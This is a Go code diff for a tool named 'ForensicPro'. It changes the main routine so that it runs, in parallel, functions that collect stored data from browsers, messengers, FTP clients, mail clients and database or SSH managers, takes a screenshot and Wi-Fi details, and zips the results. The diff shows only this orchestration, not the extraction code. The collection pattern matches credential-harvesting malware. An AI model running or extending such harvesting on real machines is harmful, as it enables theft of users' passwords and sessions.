@@ -9,6 +9,7 @@ import (
 	"ForensicPro/pkg/SystemInfos"
 	"ForensicPro/utils"
 	"fmt"
+	"sync"
 	"time"
 )
 
@@ -31,43 +32,60 @@ func main() {
 }
 
 func GetAll() {
-	Browsers.ChromeSave("ForensicPro")
-	Browsers.FirefoxSave("ForensicPro")
-	Browsers.IESave("ForensicPro")
-	Browsers.SogouSave("ForensicPro")
+	var wg sync.WaitGroup
 
-	Messengers.LineSave("ForensicPro")
-	Messengers.QQSave("ForensicPro")
-	Messengers.DiscordSave("ForensicPro")
-	Messengers.TelegramSave("ForensicPro")
-	Messengers.EnigmaSave("ForensicPro")
-	Messengers.DingTalkSave("ForensicPro")
-	Messengers.SkypeSave("ForensicPro")
+	// Browsers
+	wg.Add(4)
+	go func() { Browsers.ChromeSave("ForensicPro"); wg.Done() }()
+	go func() { Browsers.FirefoxSave("ForensicPro"); wg.Done() }()
+	go func() { Browsers.IESave("ForensicPro"); wg.Done() }()
+	go func() { Browsers.SogouSave("ForensicPro"); wg.Done() }()
 
-	FTPS.FileZillaSave("ForensicPro")
-	FTPS.SnowflakeSave("ForensicPro")
-	FTPS.WinSCPSave("ForensicPro")
+	// Messengers
+	wg.Add(7)
+	go func() { Messengers.LineSave("ForensicPro"); wg.Done() }()
+	go func() { Messengers.QQSave("ForensicPro"); wg.Done() }()
+	go func() { Messengers.DiscordSave("ForensicPro"); wg.Done() }()
+	go func() { Messengers.TelegramSave("ForensicPro"); wg.Done() }()
+	go func() { Messengers.EnigmaSave("ForensicPro"); wg.Done() }()
+	go func() { Messengers.DingTalkSave("ForensicPro"); wg.Done() }()
+	go func() { Messengers.SkypeSave("ForensicPro"); wg.Done() }()
 
-	Mails.FoxmailSave("ForensicPro")
-	Mails.MailBirdSave("ForensicPro")
-	Mails.OutlookSave("ForensicPro")
-	Mails.MailMasterSave("ForensicPro")
+	// FTPS
+	wg.Add(3)
+	go func() { FTPS.FileZillaSave("ForensicPro"); wg.Done() }()
+	go func() { FTPS.SnowflakeSave("ForensicPro"); wg.Done() }()
+	go func() { FTPS.WinSCPSave("ForensicPro"); wg.Done() }()
 
-	SoftWares.NeteaseCloudMusicSave("ForensicPro")
-	SoftWares.NavicatSave("ForensicPro")
-	SoftWares.VSCodeSave("ForensicPro")
-	SoftWares.XmanagerSave("ForensicPro")
-	SoftWares.FinalShellSave("ForensicPro")
-	SoftWares.SQLyogSave("ForensicPro")
-	SoftWares.SecureCRTSave("ForensicPro")
-	SoftWares.DBeaverSave("ForensicPro")
+	// Mails
+	wg.Add(4)
+	go func() { Mails.FoxmailSave("ForensicPro"); wg.Done() }()
+	go func() { Mails.MailBirdSave("ForensicPro"); wg.Done() }()
+	go func() { Mails.OutlookSave("ForensicPro"); wg.Done() }()
+	go func() { Mails.MailMasterSave("ForensicPro"); wg.Done() }()
 
-	SystemInfos.ScreenShotInfoSave("ForensicPro")
-	SystemInfos.WifiInfoSave("ForensicPro")
-	SystemInfos.InstalledAppSave("ForensicPro")
+	// SoftWares
+	wg.Add(8)
+	go func() { SoftWares.NeteaseCloudMusicSave("ForensicPro"); wg.Done() }()
+	go func() { SoftWares.NavicatSave("ForensicPro"); wg.Done() }()
+	go func() { SoftWares.VSCodeSave("ForensicPro"); wg.Done() }()
+	go func() { SoftWares.XmanagerSave("ForensicPro"); wg.Done() }()
+	go func() { SoftWares.FinalShellSave("ForensicPro"); wg.Done() }()
+	go func() { SoftWares.SQLyogSave("ForensicPro"); wg.Done() }()
+	go func() { SoftWares.SecureCRTSave("ForensicPro"); wg.Done() }()
+	go func() { SoftWares.DBeaverSave("ForensicPro"); wg.Done() }()
+
+	// SystemInfos
+	wg.Add(3)
+	go func() { SystemInfos.ScreenShotInfoSave("ForensicPro"); wg.Done() }()
+	go func() { SystemInfos.WifiInfoSave("ForensicPro"); wg.Done() }()
+	go func() { SystemInfos.InstalledAppSave("ForensicPro"); wg.Done() }()
+
+	wg.Wait()
 
 	err := utils.ZipDirectory("ForensicPro", "ForensicPro_result.zip")
 	if err != nil {
 		return
 	}
+
 }
